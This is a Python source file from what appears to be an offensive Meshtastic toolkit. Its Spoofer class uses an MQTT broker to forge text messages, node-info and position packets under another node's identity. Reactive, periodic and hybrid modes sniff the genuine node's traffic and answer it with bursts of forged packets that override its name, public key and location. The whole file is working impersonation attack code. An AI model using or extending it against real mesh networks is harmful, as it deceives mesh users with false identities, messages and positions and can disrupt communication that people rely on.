from src.mesh.packet.crafter import send_position, send_message, send_node_info
from src.clients.mqtt_client import connect_and_get_client, disconnect_client
from settings import MQTT_BROKER, MQTT_PORT, MQTT_USERNAME, MQTT_PASSWORD, ROOT_TOPIC, CHANNEL, KEY, DEBUG, BROADCAST_MAC, CLIENT_ID
from src.utils import set_topic, hw_model_to_num
from src.clients.db_client import DB
import time
import logging
import random
from meshtastic.protobuf import portnums_pb2
from src.agents.sniffer import Sniffer
import threading
from contextlib import contextmanager

def _get_publish_topic(gateway_node):
    return set_topic(gateway_node, ROOT_TOPIC, CHANNEL)

class Spoofer:
    def __init__(self):
        self.global_message_id = random.getrandbits(32)

    def _get_mqtt_client(self, publish_topic, timeout=5):
        client = connect_and_get_client(
            MQTT_BROKER, MQTT_PORT, MQTT_USERNAME, MQTT_PASSWORD, KEY, DEBUG, lambda: None, publish_topic, CLIENT_ID
        )
        # Wait for connection (max timeout seconds)
        waited = 0
        while not client.is_connected() and waited < timeout:
            time.sleep(0.1)
            waited += 0.1
        if not client.is_connected():
            logging.error(f"MQTT client failed to connect after {timeout} seconds!")
        return client

    @contextmanager
    def mqtt_client_context(self, publish_topic):
        client = self._get_mqtt_client(publish_topic)
        try:
            yield client
        finally:
            disconnect_client(client, DEBUG)

    def spoof_message(self, to_node, message_text, from_node, gateway_node=None):
        publish_topic = _get_publish_topic(gateway_node or BROADCAST_MAC)
        mqtt_client = self._get_mqtt_client(publish_topic)
        time.sleep(1)
        if mqtt_client and mqtt_client.is_connected():
            logging.info(f"Spoofing message: {message_text}")
            send_message(
                to_node, message_text, from_node, CHANNEL, KEY,
                self.global_message_id, from_node, publish_topic, mqtt_client, DEBUG
            )
            self.global_message_id += 1
        disconnect_client(mqtt_client, DEBUG)

    def _burst_send(self, send_func, burst=1, period=0, logger_msg=None):
        # Use 1 and 0 as defaults, as no global default is needed
        for i in range(burst):
            if logger_msg:
                logging.info(f"{logger_msg} (burst {i+1}/{burst})")
            send_func()
            if i < burst - 1:
                time.sleep(period)

    def spoof_nodeinfo(self, to_node, from_node, short_name, long_name, hw_model, pubkey, gateway_node=None, burst=1, period=0):
        """
        Spoof nodeinfo packet. Optionally send a burst of packets with a delay between them.
        """
        short = short_name or ""
        long = long_name or ""
        hw = hw_model_to_num(hw_model) if hw_model is not None else 43  # Use 43 as default, or import from settings if you wish
        publish_topic = _get_publish_topic(gateway_node or BROADCAST_MAC)
        def send():
            with self.mqtt_client_context(publish_topic) as mqtt_client:
                if mqtt_client and mqtt_client.is_connected():
                    logging.info(f"Spoofing nodeinfo...")
                    send_node_info(
                        to_node, True, from_node, CHANNEL, KEY, self.global_message_id,
                        short, long, short, hw, pubkey,
                        publish_topic, mqtt_client, DEBUG
                    )
                    self.global_message_id += 1
        self._burst_send(send, burst, period, logger_msg="Spoofing nodeinfo")

    def spoof_position(self, to_node, lat, lon, alt, from_node, gateway_node=None, burst=1, period=0):
        """
        Spoof position packet. Optionally send a burst of packets with a delay between them.
        """
        la = lat if lat is not None else 0.0
        lo = lon if lon is not None else 0.0
        al = alt if alt is not None else 0.0
        publish_topic = _get_publish_topic(gateway_node or BROADCAST_MAC)
        def send():
            with self.mqtt_client_context(publish_topic) as mqtt_client:
                if mqtt_client and mqtt_client.is_connected():
                    logging.info(f"Spoofing position...")
                    send_position(
                        to_node, la, lo, al, from_node, CHANNEL, KEY, self.global_message_id, from_node, publish_topic, mqtt_client, DEBUG
                    )
                    self.global_message_id += 1
        self._burst_send(send, burst, period, logger_msg="Spoofing position")

    def spoof_node(self, to_node, from_node, short_name, long_name, hw_model, lat, lon, alt, pubkey, gateway_node=None, burst=1, period=0):
        """
        Default mode: spoof nodeinfo and position once (or burst), using resolved parameters.
        """
        params = self.get_effective_spoof_params(from_node, {
            'short_name': short_name,
            'long_name': long_name,
            'hw_model': hw_model_to_num(hw_model) if hw_model is not None else 43,
            'lat': lat,
            'lon': lon,
            'alt': alt,
            'pubkey': pubkey,
        })
        self.spoof_nodeinfo(to_node, from_node, params['short_name'], params['long_name'], params['hw_model'], params['pubkey'], gateway_node, burst, period)
        self.spoof_position(to_node, params['lat'], params['lon'], params['alt'], from_node, gateway_node, burst, period)

    def spoof_reactive(self, to_node, from_node, short_name, long_name, hw_model, lat, lon, alt, pubkey, gateway_node=None, burst=5, period=2):
        """
        Reactive mode: Spoof node when receiving nodeinfo/position from the original node, using resolved parameters.
        burst: number of packets to send per event
        period: seconds between packets in a burst
        """
        params = self.get_effective_spoof_params(from_node, {
            'short_name': short_name,
            'long_name': long_name,
            'hw_model': hw_model_to_num(hw_model) if hw_model is not None else 43,
            'lat': lat,
            'lon': lon,
            'alt': alt,
            'pubkey': pubkey,
        })
        logging.debug(f"Resolved spoof parameters: {params}")
        logging.info("Active spoofing mode enabled. Waiting for nodeinfo/position packets...")

        def on_packet_received(packet, decoded_data, portnum, from_node_mac, to_node_mac, **node_kwargs):
            logging.info(f"Packet received from {from_node_mac} to {to_node_mac} on port {portnum}")
            if portnum == portnums_pb2.NODEINFO_APP:
                if node_kwargs['short_name'] == params['short_name'] and \
                    node_kwargs['long_name'] == params['long_name'] and \
                    node_kwargs['hw_model'] == params['hw_model'] and \
                    node_kwargs['pubkey'] == params['pubkey']:
                        logging.debug("Nodeinfo matches, not spoofing again.")
                else:
                    logging.info("Nodeinfo packet received, spoofing nodeinfo burst...")
                    logging.debug(f"Nodeinfo params: {params}")
                    logging.debug(f"Nodeinfo kwargs: {node_kwargs}")
                    threading.Thread(target=self.spoof_nodeinfo, kwargs={
                        'to_node': to_node_mac,
                        'from_node': from_node_mac,
                        'short_name': params['short_name'],
                        'long_name': params['long_name'],
                        'hw_model': params['hw_model'],
                        'pubkey': params['pubkey'],
                        'burst': burst,
                        'period': period,
                        'gateway_node': gateway_node
                    }, daemon=True).start()
            elif portnum == portnums_pb2.POSITION_APP:
                if node_kwargs['lat'] == params['lat'] and node_kwargs['lon'] == params['lon'] and node_kwargs['alt'] == params['alt']:
                    logging.debug("Position matches, not starting spoofing burst.")
                else:
                    logging.info("Position packet received, spoofing position burst...")
                    threading.Thread(target=self.spoof_position, kwargs={
                        'to_node': to_node_mac,
                        'lat': params['lat'],
                        'lon': params['lon'],
                        'alt': params['alt'],
                        'from_node': from_node_mac,
                        'burst': burst,
                        'period': period,
                        'gateway_node': gateway_node
                    }, daemon=True).start()
        # freeze the node db entry
        DB.set_freeze(from_node, True)
        try:
            sniffer = Sniffer(key=KEY, debug=DEBUG)
            sniffer.sniff(
                node_id=from_node,
                callback=on_packet_received,
                enabled_portnums=[
                    portnums_pb2.NODEINFO_APP,
                    portnums_pb2.POSITION_APP
                ]   
            )
        finally:
            DB.set_freeze(from_node, False)
            logging.info(f"Node {from_node} unfrozen after spoofing session.")

    def spoof_periodic(self, to_node, from_node, short_name, long_name, hw_model, lat, lon, alt, pubkey, gateway_node=None, interval=60, burst=1, period=1):
        """
        Periodic mode: Spoof node every `interval` seconds, using resolved parameters.
        """
        params = self.get_effective_spoof_params(from_node, {
            'short_name': short_name,
            'long_name': long_name,
            'hw_model': hw_model_to_num(hw_model) if hw_model is not None else 43,
            'lat': lat,
            'lon': lon,
            'alt': alt,
            'pubkey': pubkey,
        })
        logging.info(f"Periodic spoofing mode enabled. Spoofing every {interval} seconds.")
        try:
            while True:
                self.spoof_nodeinfo(to_node, from_node, params['short_name'], params['long_name'], params['hw_model'], params['pubkey'], gateway_node, burst=burst, period=period)
                self.spoof_position(to_node, params['lat'], params['lon'], params['alt'], from_node, gateway_node, burst=burst, period=period)
                time.sleep(interval)
        except KeyboardInterrupt:
            logging.info("Periodic spoofing stopped by user.")

    def spoof_hybrid(self, to_node, from_node, short_name, long_name, hw_model, lat, lon, alt, pubkey, gateway_node=None, interval=60, burst=5, period=2):
        """
        Hybrid mode: Spoof node periodically and when receiving nodeinfo/position from the original node, using resolved parameters.
        """
        params = self.get_effective_spoof_params(from_node, {
            'short_name': short_name,
            'long_name': long_name,
            'hw_model': hw_model_to_num(hw_model) if hw_model is not None else 43,
            'lat': lat,
            'lon': lon,
            'alt': alt,
            'pubkey': pubkey,
        })
        logging.info(f"Hybrid spoofing mode enabled. Spoofing every {interval} seconds and on nodeinfo/position packets.")

        # Start periodic spoofing in a background thread using the existing method
        periodic = threading.Thread(
            target=self.spoof_periodic,
            args=(to_node, from_node, params['short_name'], params['long_name'], params['hw_model'], params['lat'], params['lon'], params['alt'], params['pubkey'], gateway_node, interval),
            daemon=True
        )
        periodic.start()

        # Run reactive spoofing in the main thread (will block until KeyboardInterrupt)
        try:
            self.spoof_reactive(
                to_node=to_node,
                from_node=from_node,
                short_name=params['short_name'],
                long_name=params['long_name'],
                hw_model=params['hw_model'],
                lat=params['lat'],
                lon=params['lon'],
                alt=params['alt'],
                pubkey=params['pubkey'],
                gateway_node=gateway_node,
                burst=burst,
                period=period
            )
        except KeyboardInterrupt:
            logging.info("Hybrid spoofing stopped by user.")
        finally:
            logging.info("Hybrid spoofing session ended.")

    def _get_node_db_values(self, node_id):
        """
        Returns a dict of spoofable parameters for a node from the DB, or None if not found.
        """
        try:
            # Try to find by node_mac first, fallback to node_number if node_id is int
            node = None
            if isinstance(node_id, str):
                node = DB.get_all_nodes()
                node = next((n for n in node if getattr(n, 'node_mac', None) == node_id), None)
            if node is None:
                try:
                    node_number = int(node_id)
                    node = DB.get_node(node_number)
                except Exception:
                    pass
            if node:
                return {
                    'short_name': getattr(node, 'short_name', None),
                    'long_name': getattr(node, 'long_name', None),
                    'hw_model': int(getattr(node, 'hw_model', 43)) if getattr(node, 'hw_model', None) is not None else 43,
                    'lat': getattr(node, 'lat', None),
                    'lon': getattr(node, 'lon', None),
                    'alt': getattr(node, 'alt', None),
                    'pubkey': getattr(node, 'pubkey', None),
                }
        except Exception as e:
            logging.debug(f"Could not fetch node from DB: {e}")
        return {}

    def _resolve_spoof_param(self, param, cli_value, db_values, fallback):
        """
        Returns the value for a spoofable parameter, preferring CLI, then DB, then fallback.
        """
        if cli_value is not None and cli_value != "":
            return cli_value
        if db_values and param in db_values and db_values[param] is not None:
            return db_values[param]
        return fallback

    def get_effective_spoof_params(self, node_id, cli_params):
        """
        Returns a dict of all spoofable parameters resolved in order: CLI > DB > default.
        """
        db_values = self._get_node_db_values(node_id)
        return {
            'short_name': self._resolve_spoof_param('short_name', cli_params.get('short_name'), db_values, ""),
            'long_name': self._resolve_spoof_param('long_name', cli_params.get('long_name'), db_values, ""),
            'hw_model': self._resolve_spoof_param('hw_model', cli_params.get('hw_model'), db_values, 43),
            'lat': self._resolve_spoof_param('lat', cli_params.get('lat'), db_values, 0.0),
            'lon': self._resolve_spoof_param('lon', cli_params.get('lon'), db_values, 0.0),
            'alt': self._resolve_spoof_param('alt', cli_params.get('alt'), db_values, 0.0),
            'pubkey': self._resolve_spoof_param('pubkey', cli_params.get('pubkey'), db_values, None),
        }

